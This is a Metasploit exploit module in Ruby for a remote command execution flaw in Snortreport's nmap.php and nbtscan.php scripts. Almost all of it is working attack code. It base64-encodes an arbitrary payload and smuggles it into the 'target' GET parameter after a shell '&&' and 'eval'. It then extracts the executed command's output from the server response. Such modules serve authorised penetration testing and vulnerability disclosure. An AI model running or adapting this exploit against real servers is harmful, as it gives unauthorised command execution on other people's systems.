# $Id: snortreport_exec.rb 13843 2011-10-09 06:12:54Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Snortreport nmap.php and nbtscan.php Remote Command Execution&#039;,
            &#039;Description&#039;    => %q{
                This module exploits an arbitrary command execution vulnerability in
                nmap.php and nbtscan.php scripts.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Paul Rascagneres&#039;  #itrust consulting during hack.lu 2011
                ],
            &#039;Version&#039;        => &#039;$Revision: 13843 $&#039;,
            &#039;Payload&#039;        =>
            {
                &#039;Compat&#039;     =>
                {
                    &#039;PayloadType&#039;  => &#039;cmd&#039;,
                    &#039;RequiredCmd&#039;  => &#039;generic perl ruby bash telnet&#039;,
                }
            },
            &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        => [[&#039;Automatic&#039;,{}]],
            &#039;DisclosureDate&#039; => &#039;Sep 19 2011&#039;,
            &#039;DefaultTarget&#039;  => 0
        ))
 
        register_options(
            [
                OptString.new(&#039;URI&#039;, [true, "The full URI path to nmap.php or nbtscan.php", "/snortreport-1.3.2/nmap.php"]),
            ],self.class)
    end
 
    def exploit
        base64_payload = ""
        base64_payload_temp=Base64.encode64(payload.encoded).chomp
        base64_payload_temp.each_line do |line|
            base64_payload << line.chomp
        end
 
        start = "127.0.0.1 && echo XXXXX && eval $(echo "
        last  = " | base64 -d) && echo ZZZZZ"
        custom_payload = start << base64_payload << last
 
        res = send_request_cgi({
            &#039;uri&#039;       => datastore[&#039;URI&#039;],
            &#039;vars_get&#039;  =>
            {
                &#039;target&#039; => custom_payload
            }
        },10)
 
        if (res)
            to_print=false
            already_print=false
            part=res.body.gsub("<BR>","")
            part.each_line do |line|
                if line =~ /ZZZZZ/
                    to_print=false
                end
                if to_print == true
                    print(line)
                end
                if line =~ /XXXXX/
                    already_print=true
                    to_print=true
                end
            end
 
            if already_print == false
                print_error("This server may not be vulnerable")
            end
        else
            print_error("No response from the server")
        end
    end
end



